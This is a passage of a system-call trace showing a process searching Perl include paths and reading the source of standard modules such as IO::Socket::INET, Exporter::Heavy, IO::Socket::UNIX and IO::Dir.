m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
10562 07:33:35.037323 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037339 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037352 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037365 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037380 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037393 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037407 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037440 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037485 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037526 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037556 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037569 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037583 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.037596 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
10562 07:33:35.037617 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:35.037632 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.037643 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:35.037662 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
10562 07:33:35.038399 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
10562 07:33:35.038657 brk(0x829c000)    = 0x829c000
10562 07:33:35.038904 read(8, "", 4096) = 0
10562 07:33:35.038930 close(8)          = 0
10562 07:33:35.040146 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
10562 07:33:35.040487 _llseek(6, 6496, [6496], SEEK_SET) = 0
10562 07:33:35.040505 _llseek(6, 0, [6496], SEEK_CUR) = 0
10562 07:33:35.040516 close(6)          = 0
10562 07:33:35.040579 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040595 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040609 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040622 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040637 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040650 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040664 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040677 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040690 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040703 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040717 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.040730 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
10562 07:33:35.040751 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
10562 07:33:35.040766 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5e38) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.040779 _llseek(6, 0, [0], SEEK_CUR) = 0
10562 07:33:35.040911 brk(0x82bd000)    = 0x82bd000
10562 07:33:35.040942 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
10562 07:33:35.041861 _llseek(6, 1386, [1386], SEEK_SET) = 0
10562 07:33:35.041920 _llseek(6, 0, [1386], SEEK_CUR) = 0
10562 07:33:35.041948 close(6)          = 0
10562 07:33:35.042022 stat64("/etc/perl/IO/Dir.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042038 stat64("/etc/perl/IO/Dir.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042052 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042065 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042079 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042092 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042105 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042117 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042130 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042142 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042155 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042168 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
10562 07:33:35.042189 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
10562 07:33:35.042203 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5e38) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.042214 _llseek(6, 0, [0], SEEK_CUR) = 0
10562 07:33:35.042234 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
10562 07:33:35.042747 stat64("/etc/perl/Tie/Hash.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042764 stat64("/etc/perl/Tie/Hash.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042777 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042790 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042804 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042817 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042831 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042842 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042866 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042908 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042922 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042967 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042981 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.042994 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
10562 07:33:35.043015 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
